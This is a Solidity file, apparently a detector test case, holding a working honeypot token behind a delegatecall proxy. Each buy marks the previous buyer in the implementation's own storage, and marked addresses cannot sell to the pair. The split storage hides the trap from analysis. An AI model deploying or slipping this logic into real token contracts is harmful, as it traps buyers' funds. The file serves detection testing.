// SPDX-License-Identifier: MIT
// Judge pass 9: a honeypot whose mark lives in the implementation's own storage. Each buy marks the
// previous buyer (a plain call to the implementation, an address the environment rule expects); a marked
// address can never sell. app/later.ts carries only the token's and the pair's slots.
pragma solidity 0.8.24;

contract J9ImplMark {
    bytes32 private constant SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    uint256 public totalSupply;
    address public pair;
    address public lastBuyer;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public marked; // used in the implementation's own context only

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function init(address holder) external {
        require(totalSupply == 0, "init");
        totalSupply = 1_000_000 ether;
        balanceOf[holder] = totalSupply;
        emit Transfer(address(0), holder, totalSupply);
    }
    function setPair(address p) external { require(pair == address(0), "set"); pair = p; }
    function decimals() external pure returns (uint8) { return 18; }
    function mark(address a) external { marked[a] = true; }
    function isMarked(address a) external view returns (bool) { return marked[a]; }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    function transfer(address to, uint256 value) external returns (bool) { _move(msg.sender, to, value); return true; }
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= value, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - value;
        _move(from, to, value);
        return true;
    }
    function _move(address from, address to, uint256 value) internal {
        address impl;
        assembly { impl := sload(SLOT) }
        if (pair != address(0) && from == pair) {
            if (lastBuyer != address(0) && lastBuyer != to) J9ImplMark(impl).mark(lastBuyer);
            lastBuyer = to;
        } else if (pair != address(0) && to == pair) {
            require(!J9ImplMark(impl).isMarked(from), "marked");
        }
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
    }
}

contract J9Proxy {
    constructor(address impl) {
        assembly { sstore(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, impl) }
    }
    fallback() external payable {
        assembly {
            let impl := sload(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)
            calldatacopy(0, 0, calldatasize())
            let ok := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            if iszero(ok) { revert(0, returndatasize()) }
            return(0, returndatasize())
        }
    }
}
